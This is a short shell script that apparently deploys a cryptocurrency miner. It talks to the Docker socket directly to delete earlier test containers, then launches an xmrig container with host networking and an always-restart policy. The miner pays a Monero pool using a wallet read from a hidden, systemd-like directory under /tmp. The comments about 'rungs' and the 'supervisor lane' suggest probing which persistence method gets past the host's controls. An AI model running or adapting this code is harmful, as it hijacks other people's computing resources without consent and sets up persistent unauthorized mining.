#!/bin/sh
# Is the supervisor lane itself the problem? No Entrypoint override, no sh -c: just let
# the image's own ./xmrig run with plain Cmd args. If THIS mines (log banner + pool
# identifier 8.8.8.8) then rungs 1-3 are dead and only the no-supervisor rungs ever
# worked. Cleans up the earlier test containers first so :47999 is free.
set -u
. /tmp/.sysd/worker.env
P=${POOL:-pool.supportxmr.com:443}
dk() { curl -sS --unix-socket /var/run/docker.sock -m 25 "$@" 2>/dev/null; }
for n in kwrt kwrt2 kwrt3; do dk -X DELETE "http://localhost/containers/$n?force=1" >/dev/null 2>&1 || :; done
CMDS="\"-o\",\"$P\",\"-u\",\"$WALLET\",\"-p\",\"8.8.8.8\",\"--rig-id\",\"8.8.8.8\",\"--no-color\",\"-k\",\"--tls\",\"--cpu-max-threads-hint=100\",\"--threads\",\"1\",\"--http-port\",\"47999\",\"--http-host\",\"0.0.0.0\""
B="{\"Image\":\"xmrig/xmrig\",\"Cmd\":[$CMDS],\"HostConfig\":{\"NetworkMode\":\"host\",\"RestartPolicy\":{\"Name\":\"always\"}}}"
echo "create: $(dk -m 40 -X POST http://localhost/containers/create?name=kwrt3 -H Content-Type:application/json -d "$B" | head -c 90)"
echo "start: [$(dk -X POST http://localhost/containers/kwrt3/start)]"
sleep 14
echo "state: $(dk http://localhost/containers/kwrt3/json | grep -o 'Running":[a-z]*' | head -1)"
echo "== log:"
dk "http://localhost/containers/kwrt3/logs?stdout=1" | head -c 400; echo
echo "== api: [$(curl -sS -m 4 http://127.0.0.1:47999/2/summary 2>/dev/null | head -c 120)]"
echo DONE2
